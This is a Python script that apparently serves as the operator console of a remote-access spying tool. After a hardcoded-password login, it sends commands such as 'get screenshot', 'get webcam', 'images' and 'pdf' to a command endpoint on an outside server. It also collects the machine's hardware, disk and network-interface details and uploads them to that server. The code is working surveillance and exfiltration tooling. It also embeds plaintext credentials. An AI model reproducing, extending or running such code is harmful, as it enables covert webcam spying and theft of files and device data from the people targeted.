import requests
import getpass
import time
import sys
import os
import platform
import psutil  # For system information
import json

# URLs and credentials
API_URL = "https://mahendranathreddynarpala.online/python_project/add-command.php"
DEVICE_INFO_URL = "https://mahendranathreddynarpala.online/python_project/upload-device-info.php"
USERNAME = "mahi"
PASSWORD = "mahi@7922"

# Function to send a command to the API
def send_command(command):
    data = {'command': command}
    try:
        response = requests.post(API_URL, data=data)
        if response.status_code == 200:
            return f"Command '{command}' sent successfully."
        else:
            return f"Failed to send command '{command}'. Response code: {response.status_code}"
    except Exception as e:
        return f"Error: {e}"

# Function to authenticate user
def authenticate_user():
    attempts = 2
    while attempts >= 0:
        user_input = input("Enter username: ")
        pass_input = getpass.getpass("Enter password: ")
        if user_input == USERNAME and pass_input == PASSWORD:
            return True  # Successful authentication
        else:
            attempts -= 1
            print(f"Invalid credentials. You have {attempts + 1} attempts left.")
    return False  # Authentication failed

# Function to collect device information
def collect_device_info():
    # Get system and hardware details
    device_info = {
        'platform': platform.system(),
        'architecture': platform.architecture(),
        'processor': platform.processor(),
        'machine': platform.machine(),
        'node': platform.node(),
        'release': platform.release(),
        'version': platform.version(),
        'python_version': sys.version,
        'os_name': os.name,
        'cpu_count': psutil.cpu_count(logical=False),  # Number of physical cores
        'cpu_logical_count': psutil.cpu_count(logical=True),  # Logical cores
        'memory_total': psutil.virtual_memory().total,  # Total RAM in bytes
        'memory_available': psutil.virtual_memory().available,  # Available RAM in bytes
        'disk_total': psutil.disk_usage('/').total,  # Total disk space
        'disk_used': psutil.disk_usage('/').used,  # Used disk space
        'disk_free': psutil.disk_usage('/').free,  # Free disk space
        'network_interfaces': psutil.net_if_addrs(),  # Network interfaces and their addresses
    }
    return device_info

# Function to send device info to the server
def send_device_info():
    device_info = collect_device_info()
    try:
        response = requests.post(DEVICE_INFO_URL, json=device_info)
        if response.status_code == 200:
            print("Device info sent successfully.")
        else:
            print(f"Failed to send device info. Response code: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

# Function to display cinematic welcome message
def cinematic_welcome():
    loading_messages = ["Launching user interface..."]

    os.system('cls' if os.name == 'nt' else 'clear')  # Clear console

    welcome_message = """
        M   M   AAAAA   H   H  III     TTTTT  OOO   OOO   L
        MM MM  A     A  H   H   I        T   O   O O   O  L
        M M M  AAAAAAA  HHHHH   I        T   O   O O   O  L
        M   M  A     A  H   H   I        T   O   O O   O  L
        M   M  A     A  H   H  III       T    OOO   OOO   LLLLL
    """

    print("\n" + "="*50)
    print(welcome_message)
    print("="*50 + "\n")

    for message in loading_messages:
        print(message)
        time.sleep(1)  # Pause for effect

    print("\n" + "="*50)
    print("System check complete. Please authenticate...\n")
    time.sleep(1)

# Main function to run in the terminal
def main():
    cinematic_welcome()  # Show animated welcome message
    
    if not authenticate_user():
        print("Access denied. Exiting...")
        return  # Exit if authentication fails
    
    print("\nAuthentication successful! Welcome Killer.")
    print("Enter your command or type 'help' for a list of commands or 'exit'/'quit' to log out.")

    while True:
        command = input("\n$ ").strip().lower()  # Get command input from the user

        if command in ['exit', 'quit']:
            print("Logging out...")
            time.sleep(1)  # Simulate logging out
            break  # Exit the loop if "exit" or "quit" is typed

        # Handle recognized commands
        if command in ['images', 'videos', 'pdf', 'get screenshot', 'get webcam', 'send device info']:
            if command == 'send device info':
                send_device_info()  # Call the send_device_info function
            else:
                response = send_command(command)
                print(f"Server Response: {response}")
        else:
            print("Unknown command. Valid commands include: 'get images', 'get videos', 'get pdf', 'get screenshot', 'get webcam', 'send device info'.")

# Run the main function
if __name__ == "__main__":
    main()
